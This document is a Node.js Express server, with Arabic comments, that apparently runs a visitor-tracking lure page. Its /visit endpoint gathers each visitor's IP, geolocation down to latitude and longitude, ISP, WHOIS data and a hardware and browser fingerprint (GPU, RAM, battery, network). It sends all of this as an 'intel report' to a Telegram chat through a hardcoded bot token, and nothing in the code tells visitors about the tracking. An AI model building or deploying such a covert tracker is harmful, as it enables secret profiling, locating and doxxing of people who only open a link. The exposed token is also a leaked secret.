const express = require("express");
const path = require("path");
const app = express();

// إعدادات السيرفر
app.use(express.json());
app.use(express.static(__dirname)); // ضروري جداً لظهور الصور (1.jpg, 2.jpg...)

// ====== CONFIG ======
const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
const TELEGRAM_CHAT_ID = "8059402181";
const PORT = process.env.PORT || 3000;

// ====== WHOIS / Network Logic ======
async function getWhois(ip) {
  try {
    const res = await fetch(`https://rdap.arin.net/registry/ip/${ip}`);
    const data = await res.json();
    return {
      org: data.entities?.[0]?.vcardArray?.[1]?.find(v => v[0] === "fn")?.[3] || "N/A",
      cidr: data.cidr0_cidrs?.[0]?.v4prefix + "/" + data.cidr0_cidrs?.[0]?.length,
      handle: `${data.startAddress} - ${data.endAddress}`,
      network: data.name,
      country: data.country
    };
  } catch (e) {
    return null;
  }
}

// ====== VISIT LOGGER ======
app.post("/visit", async (req, res) => {
  try {
    const client = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
    const ua = req.headers["user-agent"] || "";

    // جلب بيانات الموقع الجغرافي والـ ISP
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=16777215`);
    const geo = await geoRes.json();
    
    // جلب بيانات WHOIS
    const whois = await getWhois(ip);

    // تحديد نوع الجهاز
    const isMobile = /mobile|android|iphone|ipad/i.test(ua);

    const report = `
<b>🚀 FULL VISITOR INTEL REPORT (100% CAPTURE)</b>
-----------------------------------------
<b>🌐 IP & ISP DATA</b>
• <b>IP Address:</b> <code>${ip}</code>
• <b>ISP:</b> ${geo.isp}
• <b>Organization:</b> ${geo.org || "N/A"}
• <b>AS/Network:</b> ${geo.as}
• <b>Mobile Network:</b> ${geo.mobile ? "Yes 📱" : "No"}
• <b>Proxy/VPN:</b> ${geo.proxy ? "Detected ⚠️" : "No"}
• <b>Hosting/DC:</b> ${geo.hosting ? "Yes (Server)" : "No (User)"}

<b>📡 WHOIS / NETWORK</b>
• <b>Org:</b> ${whois?.org || "N/A"}
• <b>Network:</b> ${whois?.network || "N/A"}
• <b>CIDR:</b> ${whois?.cidr || "N/A"}
• <b>Handle:</b> ${whois?.handle || "N/A"}
• <b>Country:</b> ${whois?.country || geo.countryCode || "N/A"}

<b>📍 GEOGRAPHICAL INFO</b>
• <b>Country:</b> ${geo.country} (${geo.countryCode})
• <b>Region/City:</b> ${geo.regionName} / ${geo.city}
• <b>ZIP Code:</b> ${geo.zip}
• <b>Lat/Lon:</b> ${geo.lat}, ${geo.lon}
• <b>Timezone:</b> ${geo.timezone} (Client: ${client.tz || "N/A"})

<b>💻 HARDWARE FINGERPRINT</b>
• <b>GPU:</b> <code>${client.gpu || "N/A"}</code>
• <b>CPU Cores:</b> ${client.cores || "N/A"}
• <b>RAM:</b> ~${client.ram || "N/A"} GB
• <b>Platform:</b> ${client.plat || "N/A"}
• <b>Resolution:</b> ${client.res || "N/A"} (${client.ratio}x density)
• <b>Touchscreen:</b> ${client.touch > 0 ? "Yes" : "No"}

<b>📱 DEVICE</b>
• <b>Type:</b> ${isMobile ? "Mobile" : "Desktop"}

<b>🔋 LIVE DEVICE STATUS</b>
• <b>Battery:</b> ${client.battery?.lvl || "N/A"} (${client.battery?.status || "N/A"})
• <b>Net Type:</b> ${client.net?.type || "N/A"} (Speed: ${client.net?.speed || "N/A"})

<b>🧠 BROWSER IDENTIFIER</b>
• <b>Languages:</b> ${client.lang || "N/A"}
• <b>Referrer:</b> ${client.ref || "Direct"}
• <b>User-Agent:</b> <code>${ua}</code>

<b>⏰ LOGGED AT:</b> ${new Date().toUTCString()}
-----------------------------------------
`;

    // إرسال التقرير إلى تليجرام
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: report,
        parse_mode: "HTML"
      }),
    });

    res.json({ success: true });
  } catch (e) {
    console.error("Error logging visit:", e);
    res.status(500).json({ error: "failed" });
  }
});

// ====== SERVE HTML ======
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
